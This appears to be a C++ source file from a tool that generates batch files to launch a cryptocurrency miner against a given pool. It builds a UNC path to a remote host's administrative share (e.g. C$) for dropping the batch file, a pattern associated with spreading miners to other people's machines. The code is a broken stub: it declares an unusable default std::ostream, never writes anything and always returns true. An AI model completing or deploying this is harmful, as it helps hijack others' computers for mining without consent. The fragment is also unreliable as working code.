#include "BatGen.h"

BatGen::BatGen()
{

}

BatGen::~BatGen()
{

}

bool BatGen::Gen(const binHosts& mHost, const std::string& sPool)
{
	std::string sContent=mHost.sMiner+" -o "+sPool;
	std::string sPath=mHost.sPath;
	sPath[1]='$';
	std::string sBatPath="//"+mHost.sHost+"/"+sPath+"/"+mHost.sExec;

	std::ostream oFile;
	return true;
}